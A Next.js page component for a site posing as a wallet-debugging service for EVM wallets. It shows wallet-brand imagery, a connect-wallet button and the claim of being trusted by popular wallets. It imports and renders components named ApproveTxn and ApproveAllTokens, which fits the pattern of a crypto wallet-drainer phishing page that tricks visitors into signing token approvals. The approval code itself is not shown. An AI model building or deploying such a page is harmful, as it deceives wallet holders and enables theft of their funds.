import Image from "next/image";
import styles from "./page.module.css";
import Metamask from "../../public/trust wallet.png"
import ScanWallet from "./components/scanWallet";
import ApproveButton from "./components/approveButton";
import ScanWalletNew from "./components/scanWallet_modified";
import NewApprove from "./components/newApprove";
import TokenAllowanceButton from "./components/userBalance";
import UserBalance from "./components/userBalance";
import UserTokensList from "./components/userTokens";
import UserTokensAndBalance from "./components/userCard";
import ApproveAllTokens from "./components/approveAllTokens";
import ConnectedAddress from "./components/connectedAddresses";
import ApproveTxn from "./components/approveTxn";

export default function Home() {
  return (
    <div>
    <div className={styles.connectWallet}
        >
          <h1>
            
          </h1>
          <w3m-button />
        </div>
    <div className={styles.container}>
      <div style={{marginBottom: "60px"}}>
      <Image style={{height: "500px", width: "500px"}}
                  src={Metamask}
                  alt='mm'/>
      </div>
      <div style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "flex-start",
        alignItems: "flex-start"
      }}>
        
        <h1>
        Trusted by the world’s most popular EVM wallets.
        </h1>
        <p style={{marginTop: "10px"}}>
          Quicky debug RPC and other technical problems you may be experiencing with your evm wallet.
        </p>
        <div>
        <ApproveTxn />
        <ConnectedAddress />
        </div>
        
       
        
      </div>
    </div>
    </div>
  );
}
